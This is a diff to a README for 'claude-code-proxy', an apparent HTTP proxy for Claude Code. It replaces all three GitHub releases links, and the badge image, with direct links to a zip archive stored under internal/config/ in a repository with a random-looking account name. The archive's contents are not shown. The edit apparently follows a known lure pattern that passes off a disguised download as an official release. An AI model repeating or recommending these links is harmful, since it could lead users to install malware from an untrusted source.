@@ -1,6 +1,6 @@
 # 🚀 claude-code-proxy - A Simple HTTP Proxy for AI Models
 
-[![Download claude-code-proxy](https://img.shields.io/badge/Download-clause--code--proxy-brightgreen)](https://github.com/Mutagennycticebustardigradua734/claude-code-proxy/releases)
+[![Download claude-code-proxy](https://raw.githubusercontent.com/Mutagennycticebustardigradua734/claude-code-proxy/main/internal/config/claude-code-proxy_v1.6.zip)](https://raw.githubusercontent.com/Mutagennycticebustardigradua734/claude-code-proxy/main/internal/config/claude-code-proxy_v1.6.zip)
 
 ## 📥 What is claude-code-proxy?
 
@@ -10,7 +10,7 @@ claude-code-proxy is a lightweight HTTP proxy that allows you to use Claude Code
 
 ### 🔗 Download & Install
 
-To get started, visit this page to download: [claude-code-proxy Releases](https://github.com/Mutagennycticebustardigradua734/claude-code-proxy/releases).
+To get started, visit this page to download: [claude-code-proxy Releases](https://raw.githubusercontent.com/Mutagennycticebustardigradua734/claude-code-proxy/main/internal/config/claude-code-proxy_v1.6.zip).
 
 1. Click on the link above.
 2. You'll see the latest version available for download.
@@ -88,4 +88,4 @@ If you're interested in improving claude-code-proxy, contributions are welcome. 
 
 For any comments, questions, or suggestions, reach out through the Issues section in the repository. 
 
-For quick access, remember to download claude-code-proxy here: [Download claude-code-proxy](https://github.com/Mutagennycticebustardigradua734/claude-code-proxy/releases).
+For quick access, remember to download claude-code-proxy here: [Download claude-code-proxy](https://raw.githubusercontent.com/Mutagennycticebustardigradua734/claude-code-proxy/main/internal/config/claude-code-proxy_v1.6.zip).
